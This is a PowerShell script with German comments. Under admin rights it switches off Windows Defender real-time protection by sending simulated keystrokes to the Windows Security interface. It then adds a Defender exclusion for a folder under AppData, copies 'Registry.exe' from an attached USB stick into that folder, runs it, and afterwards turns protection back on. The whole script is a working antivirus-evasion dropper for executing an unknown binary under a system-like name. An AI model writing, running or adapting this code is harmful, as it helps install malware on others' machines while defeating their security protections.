if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Warning "Bitte führe das Skript als Administrator aus!"
    exit
}

Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Keyboard {
    [DllImport("user32.dll", SetLastError = true)]
    public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);

    public const int KEYEVENTF_EXTENDEDKEY = 0x1;
    public const int KEYEVENTF_KEYUP = 0x2;
    public const byte VK_LWIN = 0x5B;
    public const byte VK_S = 0x53;
    public const byte VK_TAB = 0x09;
    public const byte VK_RETURN = 0x0D;
    public const byte VK_SPACE = 0x20;
    public const byte VK_LEFT = 0x25;
    public const byte VK_ALT = 0x12;
    public const uint KEYEVENTF_KEYDOWN = 0;
    public const uint KEYEVENTF_KEYUP_FLAG = 2;

    public static void PressKey(byte key) {
        keybd_event(key, 0, KEYEVENTF_KEYDOWN, UIntPtr.Zero);
        System.Threading.Thread.Sleep(50);
        keybd_event(key, 0, KEYEVENTF_KEYUP_FLAG, UIntPtr.Zero);
        System.Threading.Thread.Sleep(50);
    }

    public static void PressWinS() {
        keybd_event(VK_LWIN, 0, KEYEVENTF_EXTENDEDKEY, UIntPtr.Zero);
        keybd_event(VK_S, 0, KEYEVENTF_EXTENDEDKEY, UIntPtr.Zero);
        System.Threading.Thread.Sleep(100);
        keybd_event(VK_S, 0, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, UIntPtr.Zero);
        keybd_event(VK_LWIN, 0, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, UIntPtr.Zero);
        System.Threading.Thread.Sleep(500);
    }

    public static void PressAltF4() {
        keybd_event(VK_ALT, 0, KEYEVENTF_KEYDOWN, UIntPtr.Zero);
        keybd_event(VK_F4, 0, KEYEVENTF_KEYDOWN, UIntPtr.Zero);
        System.Threading.Thread.Sleep(100);
        keybd_event(VK_F4, 0, KEYEVENTF_KEYUP_FLAG, UIntPtr.Zero);
        keybd_event(VK_ALT, 0, KEYEVENTF_KEYUP_FLAG, UIntPtr.Zero);
    }

    public static void PressKeyMultiple(byte key, int count) {
        for(int i=0; i<count; i++) {
            PressKey(key);
            System.Threading.Thread.Sleep(150);
        }
    }
}
"@

function Send-Keys {
    param ([string]$keys)
    Add-Type -AssemblyName System.Windows.Forms
    [System.Windows.Forms.SendKeys]::SendWait($keys)
    Start-Sleep -Milliseconds 300
}

function Check-RealtimeProtection {
    $realtimeStatus = Get-MpComputerStatus | Select-Object -ExpandProperty RealTimeProtectionEnabled
    return $realtimeStatus
}

function Disable-RealtimeProtection {
    Write-Host "Deaktiviere Echtzeitschutz via UI-Steuerung..."
    [Keyboard]::PressWinS()
    Start-Sleep -Seconds 1
    Send-Keys "Threat Protection"
    Send-Keys "{ENTER}"
    Start-Sleep -Seconds 4
    # 4x Tab
    for ($i=0; $i -lt 4; $i++) { Send-Keys "{TAB}" }
    Send-Keys "{ENTER}"
    Start-Sleep -Milliseconds 500
    Send-Keys " "
    Start-Sleep -Milliseconds 500
    Send-Keys "{LEFT}"
    Start-Sleep -Milliseconds 500
    Send-Keys "{ENTER}"
    Start-Sleep -Seconds 2
}

function Enable-RealtimeProtection {
    Write-Host "Aktiviere Echtzeitschutz via UI-Steuerung..."
    [Keyboard]::PressWinS()
    Start-Sleep -Seconds 1
    Send-Keys "Threat Protection"
    Send-Keys "{ENTER}"
    Start-Sleep -Seconds 4
    Send-Keys " "
    Start-Sleep -Milliseconds 500
    Send-Keys "{ENTER}"
    Start-Sleep -Seconds 2
    # Fenster schließen mit Alt+F4
    [Keyboard]::PressKey(0x73) # F4 (VK_F4)
    [Keyboard]::PressKeyMultiple(0x12, 1) # Alt (VK_ALT) - nur senden, kein Release? (hier besser SendWait)
    # Alternative: Fenster schließen via SendKeys Alt+F4
    Add-Type -AssemblyName System.Windows.Forms
    [System.Windows.Forms.SendKeys]::SendWait("%{F4}")
}

# Hauptlogik

$istRealtimeAn = Check-RealtimeProtection

if ($istRealtimeAn) {
    Disable-RealtimeProtection
} else {
    Write-Host "Echtzeitschutz ist bereits deaktiviert. Überspringe Deaktivierung."
}

# === DEIN USB-STICK-SKRIPT BEGINNT HIER ===

# Zielordner dynamisch bestimmen (aktueller Benutzer)
$zielOrdner = Join-Path $env:APPDATA "Microsoft\Windows"
if (-not (Test-Path $zielOrdner)) {
    Write-Host "Zielordner $zielOrdner existiert nicht, wird erstellt..."
    New-Item -Path $zielOrdner -ItemType Directory -Force
}

# Defender-Ausnahme für Zielordner hinzufügen (wichtig: zuerst machen)
Write-Host "Füge Defender-Ausnahme für $zielOrdner hinzu"
Add-MpPreference -ExclusionPath $zielOrdner

# USB-Sticks auslesen
Write-Host "Suche nach angeschlossenen USB-Sticks..."
$usbDrives = Get-WmiObject -Query "SELECT * FROM Win32_DiskDrive WHERE InterfaceType='USB'"

if (-not $usbDrives) {
    Write-Warning "Keine USB-Sticks gefunden."
    exit
}

$gefunden = $false

foreach ($drive in $usbDrives) {
    $partitions = Get-WmiObject -Query "ASSOCIATORS OF {Win32_DiskDrive.DeviceID='$($drive.DeviceID)'} WHERE AssocClass = Win32_DiskDriveToDiskPartition"
    foreach ($partition in $partitions) {
        $logicalDisks = Get-WmiObject -Query "ASSOCIATORS OF {Win32_DiskPartition.DeviceID='$($partition.DeviceID)'} WHERE AssocClass = Win32_LogicalDiskToPartition"
        foreach ($logicalDisk in $logicalDisks) {
            $driveLetter = $logicalDisk.DeviceID + "\"
            $quelleDatei = Join-Path $driveLetter "Registry.exe"
            if (Test-Path $quelleDatei) {
                Write-Host "Datei Registry.exe gefunden auf Laufwerk $driveLetter"
                $zielDatei = Join-Path $zielOrdner "Registry.exe"
                Write-Host "Kopiere Registry.exe nach $zielDatei"
                Copy-Item -Path $quelleDatei -Destination $zielDatei -Force
                $gefunden = $true
                break
            }
        }
        if ($gefunden) { break }
    }
    if ($gefunden) { break }
}

if (-not $gefunden) {
    Write-Warning "Registry.exe wurde auf keinem USB-Stick gefunden."
    exit
}

# Datei ausführen
$ausfuehrPfad = Join-Path $zielOrdner "Registry.exe"
if (Test-Path $ausfuehrPfad) {
    Write-Host "Starte Datei $ausfuehrPfad"
    Start-Process -FilePath $ausfuehrPfad
} else {
    Write-Warning "Datei zum Ausführen nicht gefunden: $ausfuehrPfad"
}

# === USB-STICK-SKRIPT ENDET HIER ===

if ($istRealtimeAn) {
    Enable-RealtimeProtection
}

Write-Host "Skript fertig."
